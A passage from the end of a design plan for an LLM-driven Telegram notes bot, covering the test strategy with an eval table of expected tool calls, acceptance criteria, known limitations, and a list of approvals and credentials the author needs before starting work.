- Integration (testcontainers, real Postgres): repositories, idempotency on duplicate `provider_message_id`, conversation locking, full turn against `FakeLLMProvider`, confirmation happy path + expiry + hash-mismatch rejection.
- Contract: Anthropic adapter against recorded fixtures (respx).
- Eval (the seed of the M2 suite): given a message, assert the *tool call and arguments*, not the prose —

  | Input | Expected |
  |---|---|
  | "Save this note: client wants the draft by Friday" | `create_note(body≈..., tags⊇[])` |
  | "What notes do I have about the client?" | `search_notes(query="client")` |
  | "Delete all my notes" | `delete_note(...)` → `REQUIRE_CONFIRMATION`, nothing deleted before "yes" |
  | "What's the time?" | `get_current_time()`, rendered in Asia/Kolkata |
  | "hello" | no tool call |

### 20.4 Acceptance criteria

1. `docker compose up -d && make migrate && make run-bot` gets a working Telegram bot in under 5 minutes from a clean checkout.
2. Messages from a non-allowlisted Telegram account are dropped and logged.
3. Notes round-trip: create via chat, find via search, delete only after explicit confirmation.
4. `SELECT` on `agent_runs` joined to `tool_calls` fully reconstructs any turn: what was in context, what the model proposed, what policy decided, what ran, what it cost.
5. Swapping `LLM_CHAT_PROVIDER=anthropic` → `openai` requires **no code change outside `llm/providers/`** (adapter stubbed with a clear "not configured" error if you haven't supplied a key).
6. CI green: ruff, mypy strict on `core/`, all tests, import-linter contracts.

### 20.5 Known limitations at end of M1

Synchronous only (a slow tool blocks the turn); no proactive messages; no memory beyond the recent-message buffer; no media (media messages get a polite "not yet"); FTS-only note search, no semantic search; single conversation summary strategy = none yet (context is a fixed window); Telegram long-polling means one instance only.

### 20.6 What I need from you before starting

1. **Approval of the architecture**, especially D1, D2, D7, D10, D11 (the locking ones).
2. **Confirmation that Docker locally is acceptable** (this is the one that changes D2).
3. A **Telegram bot token** from @BotFather and your numeric Telegram user ID (for the allowlist) — or say the word and I'll build against the CLI provider first and you can add Telegram when convenient.
4. An **Anthropic API key** — or, again, M1 can be built and fully tested against `FakeLLMProvider` and wired to a real key later. Nothing will be faked as working when it isn't.
